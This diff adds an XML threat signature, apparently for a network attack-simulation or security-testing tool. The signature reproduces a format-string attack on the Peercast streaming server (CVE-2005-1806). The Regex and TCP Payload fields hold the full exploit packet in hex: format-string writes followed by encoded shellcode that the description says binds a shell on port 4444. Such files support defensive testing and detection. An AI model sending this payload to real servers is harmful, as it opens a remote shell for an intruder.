@@ -1,0 +1,88 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Peercast URL Format String Attack"/>
+    <EngDesc display="true" value="This threat attacks the Peercast streaming server with a format string attack.  This attack causes the application to bind a shell on port 4444.  Peercast is a HTTP based application that typically listens on port 7144."/>
+    <Intent display="true">
+      <item value="Unauthorized_Use"/>
+      <item value="Buffer_Overflow"/>
+      <item value="Command_Injection"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="peercast.org"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Peercast.org_peercast"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Peercast.org_peercast_0.1211"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.securityfocus.com/archive/1/399308"/>
+    <CVEID display="true" value="CVE-2005-1806"/>
+    <bugtraqID display="true" value="13808"/>
+    <OSVDB display="true" value="16906"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="00000104acb92c1300c000a80001003c262d2256"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632730909003281250"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X47\X45\X54\X20\X2F\X68\X74\X6D\X6C\X2F\X65\X6E\X2F\X69\X6E\X64\X65\X78\X2E\X68\X74\X6D\X6C\X9C\XDA\X09\X08\X9D\XDA\X09\X08\X9E\XDA\X09\X08\X9F\XDA\X09\X08\X25\X32\X38\X30\X78\X25\X31\X32\X36\X35\X24\X6E\X25\X33\X37\X34\X78\X25\X31\X32\X36\X36\X24\X6E\X25\X32\X35\X31\X78\X25\X31\X32\X36\X37\X24\X6E\X25\X31\X35\X36\X78\X25\X31\X32\X36\X38\X24\X6E\X55\X55\X55\X55\X55\X55\X55\X55\X55\X55\X55\X55\X55\X55\X55\X55\X55\X55\X55\X55\X55\X55\X55\X55\X55\X55\X55\X55\X55\X55\X55\X55\X31\XC9\X83\XE9\XEB\XD9\XEE\XD9\X74\X24\XF4\X5B\X81\X73\X13\X85\X4F\XCA\XDF\X83\XEB\XFC\XE2\XF4\XB4\X94\X99\X9C\XD6\X25\XC8\XB5\XE3\X17\X53\X56\X64\X82\X4A\X49\XC6\X1D\XAC\XB7\X94\X13\XAC\X8C\X0C\XAE\XA0\XB9\XDD\X1F\X9B\X89\X0C\XAE\X07\X5F\X35\X29\X1B\X3C\X48\XCF\X98\X8D\XD3\X0C\X43\X3E\X35\X29\X07\X5F\X16\X25\XC8\X86\X35\X70\X07\X5F\XCC\X36\X33\X6F\X8E\X1D\XA2\XF0\XAA\X3C\XA2\XB7\XAA\X2D\XA3\XB1\X0C\XAC\X98\X8C\X0C\XAE\X07\X5F\X0D\X0A\X0D\X0A\X0D\X0A"/>
+    <Created value="1139462368" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026, 65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F68746D6C2F656E2F696E6465782E68746D6C9CDA09089DDA09089EDA09089FDA090825323830782531323635246E25333734782531323636246E25323531782531323637246E25313536782531323638246E555555555555555555555555555555555555555555555555555555555555555531C983E9EBD9EED97424F45B817313854FCADF83EBFCE2F4B494999CD625C8B5E317535664824A49C61DACB79413AC8C0CAEA0B9DD1F9B890CAE075F35291B3C48CF988DD30C433E3529075F1625C8863570075FCC36336F8E1DA2F0AA3CA2B7AA2DA3B10CAC988C0CAE075F0D0A0D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502f312e3120323030204f4b0d0a5365727665723a204170616368650d0a4c6173742d4d6f6469666965643a204d6f6e2c2030322046656220323030342031313a33323a343120474d540d0a455461673a202261396436652d3830302d33643235636631383534383430220d0a4163636570742d52616e6765733a2062797465730d0a436f6e74656e742d4c656e6774683a20350d0a4b6565702d416c6976653a2074696d656f75743d31352c206d61783d3130300d0a436f6e6e656374696f6e3a204b6565702d416c6976650d0a436f6e74656e742d547970653a20746578742f706c61696e0d0a0d0a50776e5421" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
